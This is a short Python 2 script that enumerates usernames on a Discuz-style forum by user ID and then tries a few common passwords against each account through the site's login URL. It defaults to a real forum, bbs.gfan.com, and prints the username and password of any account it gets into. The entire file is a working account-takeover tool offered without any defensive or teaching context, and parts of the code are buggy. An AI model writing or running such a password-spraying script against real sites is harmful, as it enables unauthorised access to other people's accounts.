# -*- coding: cp936 -*-
import urllib2, urllib
import re

checkUser="member.php?mod=logging&action=login\
&loginsubmit=yes&infloat=yes&lssubmit\
=yes&inajax=1&handlekey=ls&quickforward\
=yes&password="

checkUser2="&username="

def getUserName(html_in):
    userNameRe = re.compile('<title>(.+?)'+"\xe7\x9a\x84")
    userName = userNameRe.findall(html_in)
    #print userName
    if userName:
        return userName[0]
    else:
        return "not match"

def testPass(url_parse,username):
    for password in ["123456", "654321", "a123456", "111111"]:
        url_to_read = url_parse + password + checkUser2 + username
        login_html = urllib2.urlopen(url_to_read).read().decode(encoder, 'ignore') .encode("utf-8")
        if "location" in login_html:
            print username+" password is "+password
        
    
    
    

url=raw_input("input the url:")
encoder=raw_input("input the encoder:")
id_range=raw_input("input the id range(default:1000-2000):")
if "http://" not in url:
    url = "http://bbs.gfan.com/"
if id_range is "" or "-" not in id_range:
    id_range="1000-1001"
if encoder is "" :
    encoder = "gbk" 
if not  id_range.split("-")[0].isdigit() and not id_range.split("-")[1].isdigit():
    id_range="1000-1001"
id_start = int(id_range.split("-")[0])
id_end = int(id_range.split("-")[1])
for i in range(id_start,id_end+1):
    #print i
    url_to_read = url + "?" + str(i)
    #print url_to_read
    user_html = urllib2.urlopen(url_to_read).read().decode(encoder, 'ignore') .encode("utf-8")
    #print user_html
    print "now testing uid is "+i
    if "not match" not in getUserName(user_html).decode("utf-8", 'ignore') .encode("utf-8"):
        username = getUserName(user_html).decode("utf-8", 'ignore') .encode("utf-8")
        testPass(url+checkUser,username)
    else:
        print "not valid user id"

     


print id_start,id_end
